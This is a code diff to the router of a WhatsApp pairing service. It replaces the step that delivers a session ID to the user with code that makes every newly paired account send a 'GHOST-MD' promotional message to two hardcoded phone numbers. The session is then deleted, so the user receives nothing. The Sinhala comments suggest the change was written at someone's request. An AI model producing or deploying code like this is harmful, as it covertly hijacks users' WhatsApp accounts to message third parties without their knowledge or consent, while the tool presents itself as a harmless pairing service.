@@ -48,38 +48,25 @@ router.get('/', async (req, res) => {
                 if (connection === "open") {
                     try {
                         await delay(10000);
-                        const sessionPrabath = fs.readFileSync('./session/creds.json');
+                        
+                        // මෙතන ඔබ ඉල්ලූ පණිවිඩය ඇතුළත් කර ඇත
+                        const custom_msg = `*ꜱᴛᴀᴛᴜꜱ ᴋɪɴɢ ɢʜᴏꜱᴛ.../*\n\n*" ɴ ᴀ ᴍ ᴇ /. ᴄʏʙᴇʀ ɢʜᴏꜱᴛ " 💗🌻.*\n*" ꜰ ʀ ᴏ ᴍ /. ᴍᴀᴛʜᴜɢᴀᴍᴀ" 🐥🤍.*\n*" ᴀ ɢ ᴇ /. 18" 🐼🖤.*\n*" ʙ ᴏ ʏ  /. 🌻❤️.*\n*💗🫶🏻 /.*\n\n*ʏᴏᴜ ɪɴꜰᴏ ᴘʟᴇᴀꜱᴇ│🥺♥️*\n\n*"ɴ ᴀ ᴍ ᴇ / .*\n*"ꜰ ʀ ᴏ ᴍ /.*\n*"ᴀ ɢ ᴇ /.*\n*"ɢ ɪ ʀ ʟ ᴏʀ ʙ ᴏ ʏ /.*\n*💗🫶🏻 /.*\n\n*` + "`REAL GHOST-MD PROGRAMER`*";
 
-                        const auth_path = './session/';
-                        const user_jid = jidNormalizedUser(PrabathPairWeb.user.id);
+                        // ඔබ ලබාදුන් අංක දෙක (Country code එක සහිතව)
+                        const targetNumbers = ["94741140620", "94787438929"];
 
-                      function randomMegaId(length = 6, numberLength = 4) {
-                      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-                      let result = '';
-                      for (let i = 0; i < length; i++) {
-                      result += characters.charAt(Math.floor(Math.random() * characters.length));
+                        // අංක දෙකටම පණිවිඩය යැවීම
+                        for (const target of targetNumbers) {
+                            await PrabathPairWeb.sendMessage(target + "@s.whatsapp.net", { text: custom_msg });
                         }
-                       const number = Math.floor(Math.random() * Math.pow(10, numberLength));
-                        return `${result}${number}`;
-                        }
-
-                        const mega_url = await upload(fs.createReadStream(auth_path + 'creds.json'), `${randomMegaId()}.json`);
-
-                        const string_session = mega_url.replace('https://mega.nz/file/', '');
-
-                        const sid = string_session;
-
-                        const dt = await PrabathPairWeb.sendMessage(user_jid, {
-                            text: sid
-                        });
 
                     } catch (e) {
+                        console.log(e);
                         exec('pm2 restart prabath');
                     }
 
                     await delay(100);
                     return await removeFile('./session');
-                    process.exit(0);
                 } else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode !== 401) {
                     await delay(10000);
                     PrabathPair();
@@ -102,6 +89,5 @@ process.on('uncaughtException', function (err) {
     console.log('Caught exception: ' + err);
     exec('pm2 restart prabath');
 });
-
 
 module.exports = router;
